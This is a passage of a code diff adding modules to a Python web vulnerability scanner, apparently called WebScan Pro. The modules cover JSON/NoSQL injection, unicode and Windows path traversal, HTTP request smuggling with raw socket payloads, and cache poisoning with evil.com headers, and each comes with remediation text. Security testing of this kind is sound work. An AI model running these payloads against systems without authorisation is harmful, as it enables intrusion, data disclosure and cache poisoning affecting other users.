+                        vuln(f"Business Logic Flaw at {ep} — accepted {payload}", "High")
+                        found = True
+                        break
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    # Test workflow bypass — accessing step N+1 without step N
+    workflow_steps = [
+        ("/checkout/step1","/checkout/step3"),
+        ("/checkout/payment","/checkout/confirm"),
+        ("/signup/step1","/signup/complete"),
+        ("/order/review","/order/complete"),
+    ]
+    for step1, step3 in workflow_steps:
+        try:
+            # Skip step 1, go directly to step 3
+            r = SESSION.get(base+step3, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200 and "step" not in r.url.lower().replace(step3,""):
+                # We reached step 3 without going through step 1
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in ["confirm","complete","place order","submit","payment"]):
+                    add("biz_logic_adv", {
+                        "type": "Workflow Bypass",
+                        "severity": "High",
+                        "url": base+step3,
+                        "detail": f"Direct access to {step3} without completing {step1} — multi-step workflow can be bypassed",
+                        "remediation": (
+                            "1. Validate workflow state server-side before each step\n"
+                            "2. Use server-side session to track completed steps\n"
+                            "3. Redirect to step 1 if previous steps not completed"),
+                    })
+                    vuln(f"Workflow Bypass: {step3} accessible without {step1}", "High")
+                    found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("Business Logic: No business logic flaws detected")
+    _module_done("biz_logic_adv")
+
+
+# ═══ MODULE 121 — JSON INJECTION (v14.0) ══════════════════════════
+def json_injection_scan(url):
+    """MODULE 121 — JSON injection and parameter pollution."""
+    if _module_skip("json_inject"):
+        info("Skipping JSON Injection (already done)"); return
+    section("MODULE 121 — JSON INJECTION","{ }")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    payloads = [
+        '{"role":"admin"}',
+        '{"admin":true,"user":"test"}',
+        '{"__proto__":{"admin":true}}',
+        '{"constructor":{"prototype":{"admin":true}}}',
+        '{"$where":"1==1"}',
+        '{"$gt":""}',
+        '{"username":"admin","password":{"$gt":""}}',
+        '{"id":{"$regex":".*"}}',
+        '{"key":"value","extra_field":"injected"}',
+        '{"user_id":1,"admin":true}',
+    ]
+    api_paths = ["/api","/api/v1","/api/v2","/api/users","/api/login",
+                 "/api/auth","/api/data","/json","/graphql"]
+    hdrs = {"Content-Type":"application/json","Accept":"application/json"}
+    error_signs = ["error","exception","traceback","undefined","syntax","invalid json",
+                   "unexpected token","json parse","jsonexception"]
+    success_signs = ["admin","true","role","token","access","granted","success"]
+    for path in api_paths:
+        ep = base + path
+        try:
+            r0 = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r0.status_code not in (200, 201, 400, 405): continue
+            for payload in payloads:
+                try:
+                    r = SESSION.post(ep, data=payload.encode(),
+                                     headers=hdrs, timeout=TIMEOUT, verify=False)
+                    resp_l = r.text.lower()
+                    if r.status_code in (200,201) and any(s in resp_l for s in success_signs):
+                        add("json_inject", {
+                            "type": "JSON Injection",
+                            "severity": "High",
+                            "url": ep,
+                            "payload": payload,
+                            "detail": f"JSON injection payload '{payload[:60]}' produced success response at {ep}",
+                            "remediation": (
+                                "1. Validate JSON schema strictly\n"
+                                "2. Never use eval() on JSON input\n"
+                                "3. Whitelist expected JSON fields\n"
+                                "4. Use JSON schema validation libraries"),
+                        })
+                        vuln(f"JSON Injection at {ep}", "High")
+                        found = True
+                        break
+                    elif any(s in resp_l for s in error_signs):
+                        add("json_inject", {
+                            "type": "JSON Error Disclosure",
+                            "severity": "Low",
+                            "url": ep,
+                            "payload": payload,
+                            "detail": f"JSON parsing error exposed with payload at {ep}",
+                            "remediation": "Return generic error messages. Do not expose JSON parser errors.",
+                        })
+                except Exception:
+                    pass
+        except Exception:
+            pass
+    if not found:
+        good("JSON Injection: No injection points found")
+    _module_done("json_inject")
+
+
+# ═══ MODULE 122 — API VERSIONING ATTACK (v14.0) ════════════════════
+def api_version_attack(url):
+    """MODULE 122 — Test old/unpatched API versions."""
+    if _module_skip("api_version"):
+        info("Skipping API Version Attack (already done)"); return
+    section("MODULE 122 — API VERSION ATTACK","📡")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    # Common API version patterns
+    version_paths = [
+        "/v1","/v2","/v3","/v4","/v0",
+        "/api/v1","/api/v2","/api/v3","/api/v4","/api/v0",
+        "/api/v1.0","/api/v2.0","/api/v1.1",
+        "/api/2019-01-01","/api/2020-01-01","/api/2018-01-01",
+        "/api/beta","/api/alpha","/api/dev","/api/test",
+        "/api/legacy","/api/old","/api/deprecated",
+        "/v1/admin","/v1/users","/v1/data","/v2/admin",
+        "/api/v1/admin","/api/v1/users","/api/v1/config",
+    ]
+    # Common endpoints to test per version
+    test_endpoints = ["/users","/admin","/config","/settings","/data",""]
+    sensitive_patterns = ["admin","token","secret","password","key","config","debug","internal"]
+    detected_versions = []
+    for ver_path in version_paths:
+        try:
+            r = SESSION.get(base+ver_path, timeout=TIMEOUT, verify=False)
+            if r.status_code in (200, 401, 403):
+                detected_versions.append(ver_path)
+                # Check if old version has less auth
+                if r.status_code == 200:
+                    resp_l = r.text.lower()
+                    if any(s in resp_l for s in sensitive_patterns):
+                        sev = "High" if "admin" in resp_l or "token" in resp_l else "Medium"
+                        add("api_version", {
+                            "type": f"Old API Version Accessible: {ver_path}",
+                            "severity": sev,
+                            "url": base+ver_path,
+                            "detail": f"API version {ver_path} accessible and returns sensitive data — may be unpatched",
+                            "remediation": (
+                                "1. Decommission or restrict old API versions\n"
+                                "2. Apply same security patches to all API versions\n"
+                                "3. Redirect old versions to current with 301\n"
+                                "4. Require authentication on all API versions"),
+                        })
+                        vuln(f"Old API version accessible: {base+ver_path}", sev)
+                        found = True
+        except Exception:
+            pass
+    # Compare versions — if v1 returns more data than v3, that's a finding
+    if len(detected_versions) > 1:
+        info(f"API Version: found {len(detected_versions)} versions: {detected_versions[:5]}")
+    if not found and detected_versions:
+        good(f"API Version: {len(detected_versions)} versions found but no security issues detected")
+    elif not found:
+        good("API Version: No old API versions accessible")
+    _module_done("api_version")
+
+
+# ═══ MODULE 123 — UNICODE NORMALIZATION ATTACK (v14.0) ═════════════
+def unicode_normalization_scan(url):
+    """MODULE 123 — Unicode normalization and homograph attacks."""
+    if _module_skip("unicode_norm"):
+        info("Skipping Unicode Normalization (already done)"); return
+    section("MODULE 123 — UNICODE NORMALIZATION","🌐")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    # Unicode normalization bypass payloads
+    payloads = [
+        # Overlong UTF-8 sequences
+        ("%c0%af",          "Overlong slash — path traversal bypass"),
+        ("%c1%9c",          "Overlong backslash"),
+        ("%e0%80%af",       "3-byte overlong slash"),
+        # Unicode path traversal
+        ("%2e%2e%c0%af",    "Unicode ../ bypass"),
+        ("..%c0%af",        "Mixed unicode traversal"),
+        # Homograph payloads in params
+        ("\u0041\u0064\u006d\u0069\u006e", "Unicode admin"),  # Admin in Unicode
+        ("%u002e%u002e%u002f", "Unicode escaped ../"),
+        # Case normalization
+        ("ADMIN","Uppercase admin bypass"),
+        ("Admin","Mixed case bypass"),
+        # Zero-width characters
+        ("ad\u200bmin","Zero-width space in admin"),
+        ("ad\ufeffmin","BOM injection"),
+    ]
+    path_params = list(parse_qs(parsed.query).keys())[:2] or ["path","file","user","role","page"]
+    admin_paths = ["/admin","/Admin","/ADMIN",
+                   "/\u0061\u0064\u006d\u0069\u006e",   # Unicode admin
+                   "/%61%64%6d%69%6e",                   # Hex encoded
+                   "/%2561%2564%256d%2569%256e",          # Double encoded
+                   ]
+    # Test path-based unicode bypass
+    for path in admin_paths:
+        try:
+            r = SESSION.get(base+path, timeout=TIMEOUT, verify=False)
+            if r.status_code in (200,):
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in ["admin","dashboard","control","panel"]):
+                    add("unicode_norm", {
+                        "type": "Unicode Path Bypass",
+                        "severity": "High",
+                        "url": base+path,
+                        "detail": f"Admin path accessible via unicode encoding: {base+path}",
+                        "remediation": (
+                            "1. Normalize all URLs before access control checks\n"
+                            "2. Decode percent-encoding before path comparison\n"
+                            "3. Use framework-level normalization\n"
+                            "4. Test access controls with encoded paths"),
+                    })
+                    vuln(f"Unicode Path Bypass: {base+path}", "High")
+                    found = True
+        except Exception:
+            pass
+    # Test parameter-based unicode
+    for pname in path_params:
+        for payload, desc in payloads[:5]:
+            ep = f"{base}{parsed.path}?{pname}={payload}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                if r.status_code == 200 and len(r.content) > 0:
+                    resp_l = r.text.lower()
+                    if "root:" in resp_l or "admin" in resp_l:
+                        add("unicode_norm", {
+                            "type": "Unicode Parameter Bypass",
+                            "severity": "High",
+                            "url": ep,
+                            "payload": payload,
+                            "detail": f"Unicode bypass '{desc}' succeeded on param '{pname}'",
+                            "remediation": "Normalize unicode input before validation. Use NFC normalization.",
+                        })
+                        vuln(f"Unicode bypass [{pname}={payload}]: {desc}", "High")
+                        found = True
+            except Exception:
+                pass
+    if not found:
+        good("Unicode Normalization: No bypass found")
+    _module_done("unicode_norm")
+
+
+# ═══ MODULE 124 — WINDOWS PATH TRAVERSAL (v14.0) ══════════════════
+def windows_path_traversal_scan(url):
+    """MODULE 124 — Windows-specific path traversal attacks."""
+    if _module_skip("win_traversal"):
+        info("Skipping Windows Path Traversal (already done)"); return
+    section("MODULE 124 — WINDOWS PATH TRAVERSAL","🪟")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+    win_payloads = [
+        ("..\\..\\..\\windows\\win.ini",       "Classic Windows traversal"),
+        ("..%5c..%5c..%5cwindows%5cwin.ini",   "URL-encoded backslash"),
+        ("..\\..\\.\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts file"),
+        ("..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","Encoded hosts"),
+        ("C:\\windows\\win.ini",               "Absolute Windows path"),
+        ("C:/windows/win.ini",                 "Forward slash Windows path"),
+        ("%2e%2e%5c%2e%2e%5cwindows%5cwin.ini","Double encoded"),
+        ("....\\\\....\\\\windows\\win.ini",   "Double dot bypass"),
+        ("/../../windows/win.ini",             "Linux-style but Windows target"),
+        ("C:\\\\windows\\\\win.ini",           "Double backslash"),
+        ("%c0%5c..%c0%5cwindows%c0%5cwin.ini", "Unicode + backslash"),
+    ]
+    win_success_signs = ["[fonts]","[extensions]","[mci extensions]","[files]",
+                         "[mail]","windows","ini","[boot loader]","localhost"]
+    test_params = list(params.keys())[:3] if params else ["file","path","page","include","load","doc"]
+    for pname in test_params:
+        for payload, desc in win_payloads:
+            ep = f"{base}{parsed.path}?{pname}={_ue(payload)}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in win_success_signs):
+                    add("win_traversal", {
+                        "type": "Windows Path Traversal",
+                        "severity": "Critical",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "detail": f"Windows file accessible via traversal '{desc}' on param '{pname}'",
+                        "remediation": (
+                            "1. Use realpath() / GetFullPathName() to resolve paths\n"
+                            "2. Whitelist allowed directories\n"
+                            "3. Block backslash characters in file path params\n"
+                            "4. Run web server with minimal file system permissions"),
+                    })
+                    vuln(f"Windows Path Traversal [{pname}] — {desc}", "Critical")
+                    found = True
+                    break
+            except Exception:
+                pass
+    if not found:
+        good("Windows Path Traversal: No Windows traversal found")
+    _module_done("win_traversal")
+
+
+# ═══ SCAN HISTORY DATABASE (v14.0) ════════════════════════════════
+def _init_history_db():
+    """Initialize SQLite scan history database."""
+    db_path = os.path.expanduser("~/.webscan_history.db")
+    try:
+        import sqlite3 as _sq
+        conn = _sq.connect(db_path)
+        c = conn.cursor()
+        c.execute("""CREATE TABLE IF NOT EXISTS scans (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            target TEXT,
+            version TEXT,
+            critical INTEGER,
+            high INTEGER,
+            medium INTEGER,
+            low INTEGER,
+            info INTEGER,
+            total INTEGER,
+            risk_score REAL,
+            modules_run TEXT,
+            report_path TEXT
+        )""")
+        c.execute("""CREATE TABLE IF NOT EXISTS findings (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            scan_id INTEGER,
+            category TEXT,
+            severity TEXT,
+            type TEXT,
+            url TEXT,
+            detail TEXT,
+            FOREIGN KEY(scan_id) REFERENCES scans(id)
+        )""")
+        conn.commit()
+        conn.close()
+        return db_path
+    except Exception as _e:
+        warn(f"History DB init failed: {_e}")
+        return None
+
+
+def save_scan_history(target, report_path=""):
+    """Save scan results to history database."""
+    section("SCAN HISTORY — SAVING TO DATABASE","💾")
+    db_path = _init_history_db()
+    if not db_path:
+        return
+    try:
+        import sqlite3 as _sq
+        counts = _sev_counts()
+        total  = _total()
+        score  = _risk_score()
+        ts     = datetime.datetime.now().isoformat()
+        modules_run = json.dumps(list(FINDINGS.keys()))
+        conn = _sq.connect(db_path)
+        c = conn.cursor()
+        # Insert scan record
+        c.execute("""INSERT INTO scans
+            (timestamp,target,version,critical,high,medium,low,info,total,risk_score,modules_run,report_path)
+            VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
+            (ts, target, VERSION,
+             counts.get("Critical",0), counts.get("High",0),
+             counts.get("Medium",0),   counts.get("Low",0),
+             counts.get("Info",0),     total, score,
+             modules_run, report_path))
+        scan_id = c.lastrowid
+        # Insert individual findings
+        for cat, items in FINDINGS.items():
+            for item in (items if isinstance(items, list) else []):
+                if isinstance(item, dict):
+                    c.execute("""INSERT INTO findings
+                        (scan_id,category,severity,type,url,detail) VALUES (?,?,?,?,?,?)""",
+                        (scan_id, cat,
+                         item.get("severity","Info"),
+                         item.get("type",cat),
+                         item.get("url",target),
+                         str(item.get("detail",""))[:500]))
+        conn.commit()
+        # Compare with last scan
+        c.execute("""SELECT id,timestamp,critical,high,medium,total,risk_score
+                     FROM scans WHERE target=? ORDER BY id DESC LIMIT 2""", (target,))
+        rows = c.fetchall()
+        conn.close()
+        good(f"Scan history saved (ID: {scan_id}) — {db_path}")
+        if len(rows) >= 2:
+            curr = rows[0]; prev = rows[1]
+            info(f"\n  ── COMPARISON WITH LAST SCAN ({prev[1][:16]}) ──")
+            diff_crit = curr[2] - prev[2]
+            diff_high = curr[3] - prev[3]
+            diff_total = curr[5] - prev[5]
+            diff_score = curr[6] - prev[6]
+            icon_c = "🔴 +" if diff_crit > 0 else ("🟢 " if diff_crit < 0 else "  ")
+            icon_h = "🔴 +" if diff_high > 0 else ("🟢 " if diff_high < 0 else "  ")
+            icon_t = "🔴 +" if diff_total > 0 else ("🟢 " if diff_total < 0 else "  ")
+            info(f"  Critical : {prev[2]} → {curr[2]}  ({icon_c}{diff_crit})")
+            info(f"  High     : {prev[3]} → {curr[3]}  ({icon_h}{diff_high})")
+            info(f"  Total    : {prev[5]} → {curr[5]}  ({icon_t}{diff_total})")
+            info(f"  Risk     : {prev[6]:.1f} → {curr[6]:.1f}  ({'+' if diff_score>0 else ''}{diff_score:.1f})")
+    except Exception as _e:
+        warn(f"History DB save failed: {_e}")
+
+
+def show_scan_history(target=None, limit=10):
+    """Show past scan history."""
+    db_path = os.path.expanduser("~/.webscan_history.db")
+    if not os.path.isfile(db_path):
+        info("No scan history found"); return
+    try:
+        import sqlite3 as _sq
+        conn = _sq.connect(db_path)
+        c = conn.cursor()
+        if target:
+            c.execute("""SELECT id,timestamp,target,critical,high,medium,total,risk_score
+                         FROM scans WHERE target=? ORDER BY id DESC LIMIT ?""", (target, limit))
+        else:
+            c.execute("""SELECT id,timestamp,target,critical,high,medium,total,risk_score
+                         FROM scans ORDER BY id DESC LIMIT ?""", (limit,))
+        rows = c.fetchall()
+        conn.close()
+        section("SCAN HISTORY","📚")
+        print(f"  {'ID':>4}  {'Date':16}  {'Target':30}  {'Crit':>4}  {'High':>4}  {'Med':>4}  {'Total':>5}  Score")
+        print("  " + "─"*80)
+        for row in rows:
+            print(f"  {row[0]:>4}  {str(row[1])[:16]:16}  {str(row[2])[:30]:30}  "
+                  f"{row[3]:>4}  {row[4]:>4}  {row[5]:>4}  {row[6]:>5}  {row[7]:.1f}")
+    except Exception as _e:
+        warn(f"History DB read failed: {_e}")
+
+
+# ═══ COMPLIANCE REPORT (v14.0) ═════════════════════════════════════
+def _build_compliance_report(target, out_path):
+    """Build OWASP Top 10 + PCI-DSS compliance report."""
+    ts_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    # Map findings to OWASP Top 10 2021
+    owasp_map = {
+        "A01:2021 — Broken Access Control":    ["idor","authn_bypass","lfi","path_norm","privesc","rfi","win_traversal"],
+        "A02:2021 — Cryptographic Failures":   ["ssl","cookies","jwt"],
+        "A03:2021 — Injection":                ["sqli","blind_sqli","xss","stored_xss","cmdi","ssti","ldap_inject","xpath_inject","json_inject","nosql_inject","null_byte"],
+        "A04:2021 — Insecure Design":          ["biz_logic_adv","csrf","race_condition","business_logic"],
+        "A05:2021 — Security Misconfiguration":["headers","methods","csp_analysis","cors","graphql","soap_wsdl","exposed_services"],
+        "A06:2021 — Vulnerable Components":    ["cve_scan","cve_exploit","nuclei"],
+        "A07:2021 — Auth & Identity Failures": ["authn_bypass","jwt","session_fix","mfa_bypass","rate_bypass","login_brute"],
+        "A08:2021 — Software & Data Integrity":["deserial","dep_confusion"],
+        "A09:2021 — Logging & Monitoring":     ["info_disclosure","error_exposed"],
+        "A10:2021 — SSRF":                     ["ssrf","oob_blind"],
+    }
+    # PCI-DSS requirements mapping
+    pci_map = {
+        "PCI Req 6.3 — Injection protection":          ["sqli","blind_sqli","cmdi","ldap_inject"],
+        "PCI Req 6.4 — XSS protection":                ["xss","stored_xss","dom_xss"],
+        "PCI Req 6.5 — Broken Auth":                   ["authn_bypass","session_fix","jwt","mfa_bypass"],
+        "PCI Req 6.6 — Sensitive data exposure":       ["ssl","cookies","env_exposure","sensitive"],
+        "PCI Req 6.7 — CSRF protection":               ["csrf"],
+        "PCI Req 6.8 — Access control":                ["idor","privesc","cors"],
+        "PCI Req 6.9 — SSRF protection":               ["ssrf","rfi"],
+        "PCI Req 11.3 — Security testing":             ["nuclei","openvas_scan","nessus_scan"],
+    }
+    all_cats = set(FINDINGS.keys())
+
+    def _check(cats_needed):
+        """Return (status, found_issues) for a compliance check."""
+        issues = [c for c in cats_needed if c in all_cats and FINDINGS.get(c)]
+        if issues:
+            return "FAIL", issues
+        return "PASS", []
+
+    # Build OWASP rows
+    owasp_rows = ""
+    owasp_pass = owasp_fail = 0
+    for req, cats in owasp_map.items():
+        status, issues = _check(cats)
+        color = "#c0392b" if status == "FAIL" else "#27ae60"
+        icon  = "✗" if status == "FAIL" else "✓"
+        if status == "FAIL": owasp_fail += 1
+        else: owasp_pass += 1
+        issue_list = ", ".join(CAT_TITLES.get(c,("","",c))[1] for c in issues[:3]) if issues else "—"
+        owasp_rows += f"""<tr>
+<td>{req}</td>
+<td style="color:{color};font-weight:bold;text-align:center">{icon} {status}</td>
+<td style="font-size:.85em;color:#7f8c8d">{issue_list}</td>
+</tr>"""
+
+    # Build PCI rows
+    pci_rows = ""
+    pci_pass = pci_fail = 0
+    for req, cats in pci_map.items():
+        status, issues = _check(cats)
+        color = "#c0392b" if status == "FAIL" else "#27ae60"
+        icon  = "✗" if status == "FAIL" else "✓"
+        if status == "FAIL": pci_fail += 1
+        else: pci_pass += 1
+        issue_list = ", ".join(CAT_TITLES.get(c,("","",c))[1] for c in issues[:3]) if issues else "—"
+        pci_rows += f"""<tr>
+<td>{req}</td>
+<td style="color:{color};font-weight:bold;text-align:center">{icon} {status}</td>
+<td style="font-size:.85em;color:#7f8c8d">{issue_list}</td>
+</tr>"""
+
+    html = f"""<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8"><title>Compliance Report</title>
+<style>
+*{{box-sizing:border-box;margin:0;padding:0}}
+body{{font-family:'Segoe UI',sans-serif;background:#f4f6f9;color:#2c3e50}}
+.header{{background:linear-gradient(135deg,#1a1a2e,#0f3460);color:#fff;padding:40px;text-align:center}}
+.header h1{{font-size:2em;font-weight:300;letter-spacing:2px}}
+.header p{{opacity:.7;margin-top:8px}}
+.container{{max-width:900px;margin:30px auto;padding:0 20px}}
+.card{{background:#fff;border-radius:10px;padding:24px;margin-bottom:20px;box-shadow:0 2px 10px rgba(0,0,0,.08)}}
+.card h2{{font-size:1.2em;border-bottom:2px solid #eee;padding-bottom:12px;margin-bottom:16px}}
+.score-row{{display:flex;gap:20px;margin-bottom:20px}}
+.score-box{{flex:1;text-align:center;padding:20px;border-radius:8px;color:#fff}}
+.score-box.pass{{background:#27ae60}} .score-box.fail{{background:#c0392b}}
+.score-box .num{{font-size:2.5em;font-weight:bold}}
+.score-box .lbl{{font-size:.85em;opacity:.9}}
+table{{width:100%;border-collapse:collapse}}
+th{{background:#1a1a2e;color:#fff;padding:10px 14px;text-align:left;font-size:.9em}}
+td{{padding:10px 14px;border-bottom:1px solid #eee;font-size:.9em}}
+tr:hover td{{background:#f8f9fa}}
+.footer{{text-align:center;padding:20px;color:#95a5a6;font-size:.8em}}
+</style></head><body>
+<div class="header">
+<h1>🔒 COMPLIANCE REPORT</h1>
+<p>Target: {target} &nbsp;|&nbsp; {ts_str} &nbsp;|&nbsp; WebScan Pro v{VERSION}</p>
+</div>
+<div class="container">
+
+<div class="card">
+<h2>📋 OWASP Top 10 — 2021 Compliance</h2>
+<div class="score-row">
+  <div class="score-box pass"><div class="num">{owasp_pass}</div><div class="lbl">PASS</div></div>
+  <div class="score-box fail"><div class="num">{owasp_fail}</div><div class="lbl">FAIL</div></div>
+</div>
+<table><tr><th>OWASP Category</th><th style="width:100px">Status</th><th>Issues Found</th></tr>
+{owasp_rows}</table></div>
+
+<div class="card">
+<h2>💳 PCI-DSS Compliance (Relevant Requirements)</h2>
+<div class="score-row">
+  <div class="score-box pass"><div class="num">{pci_pass}</div><div class="lbl">PASS</div></div>
+  <div class="score-box fail"><div class="num">{pci_fail}</div><div class="lbl">FAIL</div></div>
+</div>
+<table><tr><th>PCI-DSS Requirement</th><th style="width:100px">Status</th><th>Issues Found</th></tr>
+{pci_rows}</table></div>
+
+</div>
+<div class="footer">WebScan Pro v{VERSION} — Compliance Report — Confidential</div>
+</body></html>"""
+
+    with open(out_path,"w",encoding="utf-8") as f:
+        f.write(html)
+    good(f"Compliance Report saved: {out_path}")
+
+
+# ═══ WEBHOOK NOTIFICATION (v14.0) ══════════════════════════════════
+def send_webhook_notification(url, webhook_url):
+    """Send scan completion webhook notification."""
+    if not webhook_url:
+        return
+    section("WEBHOOK — SCAN COMPLETE NOTIFICATION","🔔")
+    counts = _sev_counts()
+    payload = {
+        "event": "scan_complete",
+        "tool": f"WebScan Pro v{VERSION}",
+        "target": url,
+        "timestamp": datetime.datetime.now().isoformat(),
+        "findings": {
+            "critical": counts.get("Critical",0),
+            "high":     counts.get("High",0),
+            "medium":   counts.get("Medium",0),
+            "low":      counts.get("Low",0),
+            "total":    _total(),
+        },
+        "risk_score": _risk_score(),
+    }
+    try:
+        data = json.dumps(payload).encode()
+        req = _ur.Request(webhook_url, data=data,
+                          headers={"Content-Type":"application/json"}, method="POST")
+        _ur.urlopen(req, timeout=10)
+        good(f"Webhook sent to {webhook_url[:50]}...")
+    except Exception as _e:
+        warn(f"Webhook failed: {_e}")
+
+
+
+# ═══════════════════════════════════════════════════════════════════
+# WebScan Pro v15.0 — MODULES 125–144 + PROFESSIONAL INTELLIGENCE
+# ═══════════════════════════════════════════════════════════════════
+
+# ═══ MODULE 125 — HTTP REQUEST SMUGGLING (v15.0) ══════════════════
+def http_request_smuggling_scan(url):
+    """MODULE 125 — HTTP Request Smuggling: CL.TE, TE.CL, TE.TE variants."""
+    if _module_skip("http_smuggling"):
+        info("Skipping HTTP Request Smuggling (already done)"); return
+    section("MODULE 125 — HTTP REQUEST SMUGGLING","📦")
+    parsed = _up(url)
+    host   = parsed.netloc
+    scheme = parsed.scheme
+    port   = 443 if scheme == "https" else 80
+    if ":" in host:
+        host, port_str = host.rsplit(":",1)
+        port = int(port_str)
+    found = False
+
+    def _raw_request(payload_bytes, use_tls=False, timeout=8):
+        """Send raw HTTP request bytes and return response bytes."""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((host, port))
+            if use_tls:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=host)
+            s.sendall(payload_bytes)
+            resp = b""
+            while True:
+                try:
+                    chunk = s.recv(4096)
+                    if not chunk: break
+                    resp += chunk
+                    if len(resp) > 8192: break
+                except Exception: break
+            s.close()
+            return resp.decode("utf-8","ignore")
+        except Exception:
+            return ""
+
+    use_tls = scheme == "https"
+    path    = parsed.path or "/"
+
+    # ── CL.TE Test ──
+    # Content-Length says body is 6 bytes, Transfer-Encoding chunked says it's 0 (empty)
+    # The smuggled "G" becomes the start of the next request
+    cl_te_payload = (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Length: 6\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Connection: keep-alive\r\n\r\n"
+        "0\r\n\r\n"
+        "G"
+    ).encode()
+
+    # ── TE.CL Test ──
+    te_cl_payload = (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Content-Length: 3\r\n"
+        "Connection: keep-alive\r\n\r\n"
+        "1\r\n"
+        "G\r\n"
+        "0\r\n\r\n"
+    ).encode()
+
+    # ── TE.TE obfuscation Test ──
+    te_te_payload = (
+        f"POST {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        "Content-Length: 4\r\n"
+        "Transfer-Encoding: chunked\r\n"
+        "Transfer-Encoding: identity\r\n"  # Obfuscated second TE header
+        "Connection: keep-alive\r\n\r\n"
+        "0\r\n\r\n"
+        "X"
+    ).encode()
+
+    tests = [
+        ("CL.TE", cl_te_payload),
+        ("TE.CL", te_cl_payload),
+        ("TE.TE", te_te_payload),
+    ]
+
+    for variant, payload in tests:
+        try:
+            # Send normal request first to get baseline response time
+            normal = _raw_request(
+                f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode(),
+                use_tls
+            )
+            baseline_len = len(normal)
+
+            # Send smuggling payload
+            resp = _raw_request(payload, use_tls)
+
+            # Detection heuristics:
+            # 1. Response contains "Invalid request" or 400/405 (server rejects malformed)
+            # 2. Second request gets unexpected response (smuggled prefix processed)
+            # 3. Timeout difference indicates server desync
+            signs_vulnerable = ["unrecognized method","invalid request",
+                                 "bad request","405 method not allowed"]
+            signs_timeout    = len(resp) == 0  # Connection closed unexpectedly
+            resp_l = resp.lower()
+
+            if any(s in resp_l for s in signs_vulnerable) or signs_timeout:
+                sev = "Critical"
+                add("http_smuggling", {
+                    "type": f"HTTP Request Smuggling ({variant})",
+                    "severity": sev,
+                    "url": url,
+                    "variant": variant,
+                    "detail": (
+                        f"{variant} smuggling: server desync detected. "
+                        "Attacker can poison front-end cache, bypass ACLs, "
+                        "hijack other users' requests, or perform XSS via response splitting."),
+                    "remediation": (
+                        "1. Normalize Transfer-Encoding headers on all proxies\n"
+                        "2. Reject ambiguous requests at the front-end\n"
+                        "3. Use HTTP/2 end-to-end (eliminates CL/TE ambiguity)\n"
+                        "4. Disable HTTP keep-alive between front-end and back-end\n"
+                        "5. Configure server to reject requests with both CL and TE"),
+                })
+                vuln(f"HTTP Request Smuggling ({variant}) at {url}", sev)
+                found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("HTTP Request Smuggling: No desync vulnerability detected")
+    _module_done("http_smuggling")
+
+
+# ═══ MODULE 126 — CACHE POISONING (v15.0) ═════════════════════════
+def cache_poisoning_scan(url):
+    """MODULE 126 — Web cache poisoning and cache deception detection."""
+    if _module_skip("cache_poison"):
+        info("Skipping Cache Poisoning (already done)"); return
+    section("MODULE 126 — CACHE POISONING / DECEPTION","🗑")
+    found = False
+
+    # Cache poisoning test headers
+    poison_headers = [
+        {"X-Forwarded-Host": "evil.com"},
+        {"X-Forwarded-Scheme": "nothttps"},
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Host": "evil.com"},
+        {"X-Forwarded-Server": "evil.com"},
+        {"X-HTTP-Host-Override": "evil.com"},
+        {"Forwarded": "host=evil.com"},
+        {"X-Original-URL": "/admin"},
+        {"X-Rewrite-URL": "/admin"},
+        {"X-Custom-IP-Authorization": "127.0.0.1"},
+    ]
+
+    try:
+        # Baseline request
+        r0 = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        baseline = r0.text
+        cache_headers = {k.lower():v for k,v in r0.headers.items()}
+        is_cached = any(h in cache_headers for h in
+                        ["cache-control","x-cache","cf-cache-status","age","x-varnish","via"])
+
+        for phdr in poison_headers:
+            try:
+                r = SESSION.get(url, headers=phdr, timeout=TIMEOUT, verify=False)
+                # Check if the poison header value appeared in response (reflected)
+                for hval in phdr.values():
+                    if hval in r.text and hval not in baseline:
+                        add("cache_poison", {
+                            "type": "Cache Poisoning via Unkeyed Header",
+                            "severity": "High",
+                            "url": url,
+                            "header": list(phdr.keys())[0],
+                            "value": hval,
+                            "detail": (
+                                f"Header '{list(phdr.keys())[0]}: {hval}' reflected in response. "
+                                "If this URL is cached, all users receive the poisoned response. "
+                                "Can be used for XSS, open redirect, or defacement at scale."),
+                            "remediation": (
+                                "1. Add unkeyed headers to cache key\n"
+                                "2. Never trust or reflect X-Forwarded-* headers without validation\n"
+                                "3. Use Vary header to key cache on relevant headers\n"
